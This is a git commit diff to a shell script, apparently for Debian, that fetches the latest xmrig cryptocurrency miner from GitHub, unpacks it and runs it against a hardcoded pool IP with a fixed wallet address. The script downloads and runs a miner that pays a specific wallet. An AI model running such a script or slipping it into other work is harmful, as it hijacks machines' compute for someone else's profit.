8ed1c2ba67565fbcf0b168bff8756ea59b964893
WifeAiBot <125169889+WifeAiBot@users.noreply.github.com>
2024-12-09 16:14:12 -0600

    Update xdebian.sh

--- scripts/xdebian.sh
+++ scripts/xdebian.sh
@@ -1,10 +1,12 @@
 #!/bin/sh
 
-apt-get update 
-apt-get install curl wget
+# Install missing dependencies (curl, wget, tar, etc.)
+apt-get update && apt-get install -y curl wget tar
+
+# Continue with the original script
 curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "xmrig.*tar.gz" | cut -d : -f 2,3 | tr -d \" | wget -qi  - -O xm.tar.gz
 mkdir xm
 tar xvf xm.tar.gz -C xm --strip-components=1
 chmod +x ./xm/xmrig
 
-./xm/xmrig -r 10 -R 2 --no-color --donate-level 1  --nicehash -o 51.15.208.89:3333 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p hash1 -k
+./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 --nicehash -o 51.15.208.89:3333 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY -p hash1 -k
